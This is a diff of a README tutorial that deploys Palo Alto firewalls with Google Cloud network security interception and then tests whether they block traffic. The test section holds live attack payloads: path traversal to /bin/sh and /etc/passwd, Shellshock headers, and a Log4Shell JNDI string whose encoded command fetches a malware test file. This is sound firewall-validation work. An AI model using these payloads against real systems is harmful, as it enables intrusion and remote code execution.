+    <pre><code>set address <b>gcp-lb-fwd-rule-1</b> ip-netmask <b>10.0.1.3/32</b></code></pre>
+
+3. Configure a loopback interface using the forwarding rule address.
+
+    ```
+    set address-group gcp-lb-fwd-rules static [ gcp-lb-fwd-rule-1 ]
+    set network interface loopback units loopback.1 ip gcp-lb-fwd-rule-1
+    set network virtual-router default interface loopback.1
+    set zone gcp-lb-check network layer3 loopback.1
+    set network interface loopback units loopback.1 interface-management-profile gcp-lb-profile
+    ```
+
+4. Commit the changes.
+
+    ```
+    commit
+    ```
+
+5. Enter `exit` twice to close the session with the firewall.
+
+> [!TIP]
+> For multi-zone deployments, repeat steps **2-3** by assigning a loopback interface to each new forwarding rule. 
+
+<br>
+
+#### Verify Health Checks
+
+1. In Cloud Shell, retrieve the health status of the load balancer’s forwarding rules. 
+
+    ```
+    gcloud compute backend-services get-health panw-lb \
+        --region=$REGION \
+        --format="json(status.healthStatus[].forwardingRuleIp,status.healthStatus[].healthState)"
+    ```
+
+    (output)
+
+    <pre>
+    {
+    "forwardingRuleIp": "10.0.1.3",
+    "healthState": "HEALTHY"
+    }</pre>
+
+
+2. Retrieve the firewall’s management address.
+
+    ```
+    gcloud compute instances list \
+        --filter='tags.items=(panw-tutorial)' \
+        --format='table[box,title="Firewall MGMT"](networkInterfaces[0].accessConfigs[0].natIP:label=EXTERNAL_IP, networkInterfaces[0].networkIP:label=INTERNAL_IP)'
+    ```
+
+3. Access the firewall’s web interface using the management address.
+
+    <pre>
+    https://<b><i>MGMT_ADDRESS</i></b></pre>
 
 ---
 
+<br>
+
+## Create Consumer Environment
+
+In the `consumer` directory, use the terraform plan to create a consumer environment. The terraform plan creates a VPC (`consumer-vpc`) , two debian VMs (`client-vm` & `web-vm`), and a GKE cluster (`cluster1`).
+
+> [!NOTE]
+> If you already have an existing consumer environment, skip to [Create Intercept Endpoint Group](#create-intercept-endpoint--endpoint-group).
+
+1. In Cloud Shell, change to the `consumer` directory.
+
+    ```
+    cd
+    cd google-cloud-nsi-tutorial/consumer
+    ```
+
+2. Create a `terraform.tfvars`
+
+    ```
+    cp terraform.tfvars.example terraform.tfvars
+    ```
+
+3. Edit `terraform.tfvars` by setting values for the following variables:  
+   
+
+    | Variable | Description | Default |
+    | :---- | :---- | :---- |
+    | `project_id` | The project ID of the consumer environment. | `null` |
+    | `mgmt_allowed_ips` | A list of IPv4 addresses that can access the VMs on `TCP:80,22`. | `["0.0.0.0/0"]` |
+    | `region` | The region to deploy the consumer resources. | `us-west1` |
+
+
+4. Initialize and apply the terraform plan.
+
+    ```
+    terraform init
+    terraform apply
+    ```
+
+    Enter `yes` to apply the plan.
+
+5. After the apply completes, terraform displays the following message:
+
+    <pre>
+    export <b>CONSUMER_PROJECT</b>=<i>your-project-id</i>
+    export <b>CONSUMER_VPC</b>=<i>consumer-vpc</i>
+    export <b>REGION</b>=<i>us-west1</i>
+    export <b>ZONE</b>=<i>s-west1-a</i>
+    export <b>CLIENT_VM</b>=<i>client-vm</i>
+    export <b>CLUSTER</b>=<i>cluster1</i>
+    export <b>ORG_ID</b>=<i>$(gcloud projects describe your-project-id --format=json | jq -r '.parent.id')</i></pre>
+
+7. **Copy-and-paste** the `ENVIRONMENT_VARIABLES` output into Cloud Shell to set environment variables.
+
+<br>
+
+### Create Intercept Endpoint & Endpoint Group
+
+Create an intercept *endpoint* and *endpoint group* and associate it with the producer's intercept *deployment group*.  Then, connect the *endpoint group* to the `consumer-vpc` via an endpoint group association. 
+
+1. ***Out-of-Band Deployment Only:*** Go to [Create Mirroring Endpoint & Endpoint Group](docs/oob_consumer.md#create-mirroring-endpoint--endpoint-group).
+
+2. Create an intercept endpoint group (`pan-epg`) referencing the producer's deployment group (`pan-dg`).
+
+    ```
+    gcloud beta network-security intercept-endpoint-groups create panw-epg \
+        --intercept-deployment-group panw-dg \
+        --project $CONSUMER_PROJECT \
+        --location global \
+        --no-async
+    ```
+
+3. Associate the intercept endpoint group with your consumer’s VPC network.
+
+    ```
+    gcloud beta network-security intercept-endpoint-group-associations create panw-epg-assoc \
+        --intercept-endpoint-group panw-epg \
+        --network $CONSUMER_VPC \
+        --project $CONSUMER_PROJECT \
+        --location global \
+        --no-async
+    ```
+
+<br>
+
+### Create Firewall Rules
+
+Create a `custom-intercept` security profile group, configure a network firewall policy with rules that use this group as the `ACTION`, and finally, associate the network firewall policy with your `consumer-vpc` network. 
+
+1. Create `custom-intercept` security profile (`pan-sp`) referencing the intercept endpoint group (`panw-epg`).  
+
+    ```
+    gcloud beta network-security security-profiles custom-intercept create panw-sp \
+        --intercept-endpoint-group panw-epg \
+        --billing-project $CONSUMER_PROJECT \
+        --organization $ORG_ID \
+        --location global
+    ```
+
+2. Add the security profile to a security profile group (`pan-spg`).
+
+    ```
+    gcloud beta network-security security-profile-groups create panw-spg \
+        --custom-intercept-profile panw-sp \
+        --billing-project $CONSUMER_PROJECT \
+        --organization $ORG_ID \
+        --location global
+    ```
+
+3. Create a network firewall policy (`consumer-policy`).  
+   
+    ```
+    gcloud compute network-firewall-policies create consumer-policy \
+        --project $CONSUMER_PROJECT \
+        --global
+    ```
+
+4. Within the network firewall policy, create two firewall rules to intercept all `INGRESS` and `EGRESS` traffic by setting the security profile group as the action within each rule.  
+   
+    ```
+    gcloud beta compute network-firewall-policies rules create 10 \
+        --project $CONSUMER_PROJECT \
+        --action apply_security_profile_group \
+        --firewall-policy consumer-policy \
+        --global-firewall-policy \
+        --layer4-configs all \
+        --src-ip-ranges 0.0.0.0/0 \
+        --dest-ip-ranges 0.0.0.0/0 \
+        --direction INGRESS  \
+        --security-profile-group organizations/$ORG_ID/locations/global/securityProfileGroups/panw-spg
+
+    gcloud beta compute network-firewall-policies rules create 11 \
+        --project $CONSUMER_PROJECT \
+        --action apply_security_profile_group \
+        --firewall-policy consumer-policy \
+        --global-firewall-policy \
+        --layer4-configs all \
+        --src-ip-ranges 0.0.0.0/0 \
+        --dest-ip-ranges 0.0.0.0/0 \
+        --direction EGRESS \
+        --security-profile-group organizations/$ORG_ID/locations/global/securityProfileGroups/panw-spg
+    ```
+
+5. Associate the network firewall policy to the `consumer-vpc` network.  
+   
+    ```
+    gcloud compute network-firewall-policies associations create \
+        --name consumer-policy-assoc \
+        --global-firewall-policy \
+        --firewall-policy consumer-policy \
+        --network $CONSUMER_VPC \
+        --project $CONSUMER_PROJECT
+    ```
+
+> [!CAUTION]
+> Once the policy is associated with the VPC, traffic matching the firewall rules will be intercepted to the producer for inspection.
+
+---
+
+<br>
+
 ## Test Inspection
-Test inspection by generating pseudo-malicious traffic between VMs and also between VMs and the internet.  Then, generate pseudo-malicious traffic within the GKE cluster (`cluster1`) to test pod-to-pod inspection. 
 
-### GCE Inspection 
-Generate pseudo-malicious traffic from the `client-vm` (10.1.0.10) to the `web-vm` (10.1.0.20) and also to the internet. 
+Test inspection by generating pseudo-malicious traffic between VMs and also between VMs and the internet.  Then, generate pseudo-malicious traffic within the GKE cluster (`cluster1`) to test pod-to-pod inspection.
 
-1. In Cloud Shell, set an environment variable to a script that generates pseudo-malicious traffic to the internet and between the `client-vm` and `web-vm`. 
+### GCE Inspection
+Simulate pseudo-malicious traffic for both east-west and north-south traffic flows.
 
-    ```
-    REMOTE_SCRIPT='
-    curl http://10.1.0.20:80/?[1-10] 
-    ns1=$(curl -s -o /dev/null -w "%{http_code}\n" http://www.eicar.org/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data "echo Content-Type: text/plain; echo; uname -a" --max-time 2)
-    ns2=$(curl -s -o /dev/null -w "%{http_code}\n" http://www.eicar.org/cgi-bin/user.sh -H "FakeHeader:() { :; }; echo Content-Type: text/html; echo ; /bin/uname -a" --max-time 2)
-    ns3=$(curl -s -o /dev/null -w "%{http_code}\n" http://www.eicar.org/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd --max-time 2)
-    ew1=$(curl -w "%{http_code}\n" -s -o /dev/null http://10.1.0.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data "echo Content-Type: text/plain; echo; uname -a" --max-time 2)
-    ew2=$(curl -w "%{http_code}\n" -s -o /dev/null http://10.1.0.20/cgi-bin/user.sh -H "FakeHeader:() { :; }; echo Content-Type: text/html; echo ; /bin/uname -a" --max-time 2)
-    ew3=$(curl -w "%{http_code}\n" -s -o /dev/null http://10.1.0.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd --max-time 2)
-    echo ""'
-    ```
-
-2. Retrieve teh VM name and zone of the `client-vm`.
+1. In Cloud Shell, remotely generate pseudo-malicious traffic on the `client-vm` to simulate malicious traffic to the `web-vm` (east/west) and to the `internet` (north/south).
 
     ```
-    read VM_ZONE <<< $(gcloud compute instances list --filter="tags.items=client-vm" --format="value(zone)")
-    ```
-
-2. Execute the remote script on the `client-vm` to simulate the malicious traffic. 
-
-    ```
-    gcloud compute ssh client-vm \
-        --zone=$VM_ZONE \
+    gcloud compute ssh $CLIENT_VM \
+        --zone $ZONE \
         --tunnel-through-iap \
-        --command="bash -c '$REMOTE_SCRIPT'"
+        --command="bash -s" << 'EOF'
+    curl -s -o /dev/null -w "%{http_code}\n" http://www.eicar.org/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data "echo Content-Type: text/plain; echo; uname -a" --max-time 2
+    curl -s -o /dev/null -w "%{http_code}\n" http://www.eicar.org/cgi-bin/user.sh -H "FakeHeader:() { :; }; echo Content-Type: text/html; echo ; /bin/uname -a" --max-time 2
+    curl -s -o /dev/null -w "%{http_code}\n" http://10.1.0.20/cgi-bin/user.sh -H "FakeHeader:() { :; }; echo Content-Type: text/html; echo ; /bin/uname -a" --max-time 2
+    curl -s -o /dev/null -w "%{http_code}\n" http://10.1.0.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd --max-time 2
+    curl -s -o /dev/null -w "%{http_code}\n" nmap -A 10.1.0.20
+    EOF
     ```
- 
-3. On the firewall, go to **Monitor → Threat** to confirm the firewall detected the threats between the `client-vm` (10.1.0.20) and `web-vm` (10.1.0.10) and also to the internet.
 
-    <img src="images/threat_gce.png">
+    (output)
+    
+    <pre>
+    <b>000
+    000 
+    000
+    000
+    000</b></pre>
+
+    > The `000` response codes indicate that the traffic was blocked by the producer. 
+    > The *out-of-band* deployment will not produce `000` response codes since it is only monitoring the traffic.
+
+
+2. On the firewall, go to **Monitor → Threat** to confirm the firewall prevented the north/south and east/west threats generated by the `client-vm` .
+
+    <img src="images/threat_gce.png" width="100%">
+
+<br>
 
 
 ### GKE Inspection
-Test pod-to-pod inspection within the GKE cluster (`cluster1`).  
 
-> [!TIP]
-> When a GKE cluster has [intranode visibility](https://cloud.google.com/kubernetes-engine/docs/how-to/intranode-visibility) enabled, traffic passing between pods on the same GKE node can be inspected by the NGFWs. Intranode visibility ensures pod-to-pod traffic is processed by the cluster's VPC network.  This feature is disabled by default on standard clusters, but can be enabled on [existing clusters](https://cloud.google.com/kubernetes-engine/docs/how-to/intranode-visibility#enable_intranode_visibility_on_an_existing_cluster). 
+Pod-to-pod traffic within a cluster can also be inspected by the firewalls using NSI.  To do this, the GKE cluster must have  [intranode visibility](https://cloud.google.com/kubernetes-engine/docs/how-to/intranode-visibility) enabled.  This feature ensures traffic between pods on the same GKE node can be inspected by the firewalls.
 
+> [!CAUTION]
+> Do not apply the demo.yaml in *any* real environment.
 
-1. In Cloud Shell, authenticate to the GKE cluster (`cluster1`).
-
-    <pre><code>gcloud container clusters get-credentials <b><i>cluster1</i></b> --region <b><i>$REGION</i></b></code></pre>
-
-2. In Cloud Shell, create a `prd` and `dev` namespace.
+1. In Cloud Shell, authenticate to the GKE cluster (`cluster1`).  
 
     ```
-    kubectl create namespace prd
-    kubectl create namespace dev
+    gcloud container clusters get-credentials cluster1 --zone $ZONE
     ```
 
-3. Deploy a `victim` pod to the `prd` namespace and an `attacker` pod to the `dev` namespace.
+2. Deploy a `victim` and `attacker` pod.
 
     ```
-    kubectl apply -n prd -f https://raw.githubusercontent.com/PaloAltoNetworks/google-cloud-packet-mirroring-tutorial/main/consumer/yaml/victim.yaml
-    kubectl apply -n dev -f https://raw.githubusercontent.com/PaloAltoNetworks/google-cloud-packet-mirroring-tutorial/main/consumer/yaml/attacker.yaml
+    kubectl apply -f https://raw.githubusercontent.com/PaloAltoNetworks/google-cloud-nsi-tutorial/main/consumer/yaml/demo.yaml
     ```
 
-
-4. Create two environment variables that contain the addresses of the `victim` and `web-app` pods.
-
-    ```
-    export VICTIM_POD=$(kubectl get pod victim -n prd --template '{{.status.podIP}}');
-    export WEB_POD=$(kubectl get pod web-app -n prd --template '{{.status.podIP}}');
-    echo $WEB_POD;
-    echo $VICTIM_POD;
-    ```
-
-5. Pass environment variables to the `attacker` pod. 
+3. Create and output two environment variables containing the IPs of the `victim` and `attacker` pods.
 
     ```
-    kubectl exec -it attacker -n dev -- /bin/bash -c "echo VICTIM_POD=$VICTIM_POD | tee -a ~/.bashrc; echo WEB_POD=$WEB_POD | tee -a ~/.bashrc"; 
+    export VICTIM_IP=$(kubectl get pod victim --template '{{.status.podIP}}')
+    export ATTACK_IP=$(kubectl get pod attacker --template '{{.status.podIP}}')
+    sleep 3
+    echo ""
+    echo VICTIM IP: $VICTIM_IP
+    echo ATTACK IP: $ATTACK_IP
+    ```
+    > Record the pod IP addresses to reference later.
+
+4. Attempt to exploit the vulnerability on the `victim` pod.
+
+    ```
+    kubectl exec -it attacker -- curl $VICTIM_IP:8080 -H 'X-Api-Version: ${jndi:ldap://attacker-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}' --max-time 2
     ```
 
-6. Open a remote session with the `attacker` pod. 
-
-    ```
-    kubectl exec -it attacker -n dev -- /bin/bash
-    ```
-
-7. Generate threats from the `attacker` pod to the `web-app` and `victim` pod.
-
-    ```
-    curl $VICTIM_POD:8080 -H 'X-Api-Version: ${jndi:ldap://attacker-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
-    ```
     (output)
-    <pre>Hello World!</pre>
 
-8. On the firewall, go to **Monitor → Threat** to view the threat between the `attacker` and `victim` pods (both pods fall within the `10.20.0.0/16` space)
+    <pre><b>curl: (28) Operation timed out after 2000 milliseconds with 0 bytes received</b></pre>
 
-    <img src="images/threat_gke.png">
+    > The `time out` response indicates the producer blocked the connection. 
+    > The *out-of-band* deployment produces a `Hello, World!` output since it is only monitoring the traffic for threats.
+
+
+6. Delete the `victim` and `attacker` pods.
+
+    ```
+    kubectl delete -f https://raw.githubusercontent.com/PaloAltoNetworks/google-cloud-nsi-tutorial/main/consumer/yaml/demo.yaml
+    ```
+
+6. On the firewall, go to **Monitor → Threat** to view the threat between the `attacker` and `victim` pods (both pods fall within the `10.20.0.0/16` space)  
+
+    <img src="images/threat_gke.png" width="100%">
+
+> [!NOTE]
+> The traffic logs should now be sourced from the pod CIDR `10.20.0.0/16` rather than the node range.  This capability gives you the necessary context to begin applying security policy at the pod level where you can leverage the Kubernetes plugin for additional automation enforcement. 
+
+---
+
+<br>
 
 ## Delete Resources
 
 ### Delete Consumer Resources
 
-1. Delete the network firewall policy, security profile, security profile group, and endpoint group, and endpoint group association. 
+1. ***Out-of-Band Deployment Only:*** Go to [Out-of-Band: Delete Consumer Resources](docs/oob_consumer.md#delete-consumer-resources).
+
+2. Delete the intercept security profile, firewall policy, endpoint, & endpoint association. 
 
     ```
     gcloud compute network-firewall-policies associations delete \
@@ -528,40 +768,62 @@ Test pod-to-pod inspection within the GKE cluster (`cluster1`).
         --location=global \
         --quiet
 
-    gcloud beta network-security security-profiles custom-mirroring delete panw-sp \
+    gcloud beta network-security security-profiles custom-intercept delete panw-sp \
         --organization $ORG_ID \
         --location=global \
         --quiet
 
-    gcloud beta network-security mirroring-endpoint-group-associations delete panw-epg-assoc \
+    gcloud beta network-security intercept-endpoint-group-associations delete panw-epg-assoc \
         --project $CONSUMER_PROJECT \
         --location global \
         --no-async
 
-    gcloud beta network-security mirroring-endpoint-groups delete panw-epg \
+    gcloud beta network-security intercept-endpoint-groups delete panw-epg \
         --project $CONSUMER_PROJECT \
         --location global \
         --no-async
     ```
 
-2. Run `terraform destroy` from the `/consumer` directory.
+4. Run `terraform destroy` from the `consumer` directory.
 
     ```
-    cd ..
-    cd google-cloud-packet-mirroring-tutorial/consumer
+    cd
+    cd google-cloud-nsi-tutorial/consumer
     terraform destroy
     ```
 
-3. Enter `yes` to delete all consumer resources.
+5. Enter `yes` to delete all consumer resources.
+ 
+<br>
 
-### Delete Producer Environment
+### Delete Producer Resources
 
-1. Run `terraform destroy` from the `/producer` directory.
+1. ***Out-of-Band Deployment Only:*** Go to [Out-of-Band: Delete Producer Resources](docs/oob_producer.md#delete-producer-resources).
+
+2. Delete the intercept deployment, forwarding rule, and intercept deployment group.
 
     ```
-    cd ..
-    cd google-cloud-packet-mirroring-tutorial/producer
+    gcloud beta network-security intercept-deployments delete panw-deployment-$ZONE \
+        --location $ZONE \
+        --no-async
+    
+    gcloud compute forwarding-rules delete panw-lb-rule-$ZONE \
+        --project $PRODUCER_PROJECT \
+        --region $REGION \
+        --quiet
+
+    gcloud beta network-security intercept-deployment-groups delete panw-dg \
+        --location global \
+        --project $PRODUCER_PROJECT \
+        --no-async
+    ```
+
+3. Run `terraform destroy` from the `/producer` directory.
+
+    ```
+    cd
+    cd google-cloud-nsi-tutorial/producer
     terraform destroy
     ```
 
-2. Enter `yes` to delete all producer resources.
+4. Enter `yes` to delete all producer resources.
